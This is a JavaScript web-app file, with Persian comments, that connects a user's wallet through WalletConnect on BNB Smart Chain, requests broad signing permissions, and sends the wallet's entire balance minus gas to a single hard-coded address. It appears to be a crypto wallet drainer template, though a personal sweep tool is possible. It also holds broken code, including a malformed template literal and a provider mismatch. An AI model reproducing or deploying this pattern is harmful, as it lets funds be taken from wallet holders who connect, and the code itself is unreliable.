import { ethers } from "ethers";
import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";

// WalletConnect project ID خودت رو اینجا بذار
const projectId = "4d08946e6c316bed5e76b450ccbb5256";

const modal = new WalletConnectModalSign({
  projectId,
  metadata: {
    name: "BNB Wallet App",
    description: "Send all BNB using WalletConnect",
    url: "http://localhost",
    icons: ["https://walletconnect.com/walletconnect-logo.png"],
  },
  explorerRecommendedWalletIds: ["trust", "metamask"],
  mobileWallets: [
    {
      id: "trust",
      name: "Trust Wallet",
      homepage: "https://trustwallet.com",
      universalLink: "https://link.trustwallet.com/wc",
      nativeLink: "trust://"
    },
    {
      id: "metamask",
      name: "MetaMask",
      homepage: "https://metamask.io",
      universalLink: "https://metamask.app.link/wc",
      nativeLink: "metamask://"
    }
  ]
});

const connectBtn = document.getElementById("connectBtn");
const sendBtn = document.getElementById("sendBtn");
const addressSpan = document.getElementById("address");
const balanceSpan = document.getElementById("balance");

let signer;

connectBtn.addEventListener("click", async () => {
  try {
    const session = await modal.connect({
      requiredNamespaces: {
        eip155: {
          methods: ["eth_sendTransaction", "eth_sign", "personal_sign", "eth_signTypedData"],
          chains: ["eip155:56"],
          events: ["chainChanged", "accountsChanged"],
        },
      },
    });

    const account = session.namespaces.eip155.accounts[0];
    const address = account.split(":")[2];
    addressSpan.textContent = address;

    const provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();

    const balance = await provider.getBalance(address);
    const bnb = ethers.formatEther(balance);
    balanceSpan.textContent = $`{bnb} BNB`;

  } catch (err) {
    console.error("Connection failed", err);
  }
});

sendBtn.addEventListener("click", async () => {
  if (!signer) {
    alert("Please connect your wallet first.");
    return;
  }

  try {
    const sender = await signer.getAddress();
    const provider = signer.provider;
    const balance = await provider.getBalance(sender);

    const gasLimit = 21000n;
    const gasPrice = await provider.getFeeData().then(fee => fee.gasPrice || 5n * 10n ** 9n);
    const fee = gasLimit * gasPrice;
    const amountToSend = balance - fee;

    const tx = {
      to: "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05", // <-- آدرس مقصد رو اینجا بذار
      value: amountToSend,
      gasLimit,
      gasPrice
    };

    const txResponse = await signer.sendTransaction(tx);
    alert(`Transaction sent!\nTx Hash: ${txResponse.hash}`);
  } catch (err) {
    console.error("Transaction failed", err);
    alert("Transaction failed: " + err.message);
  }
});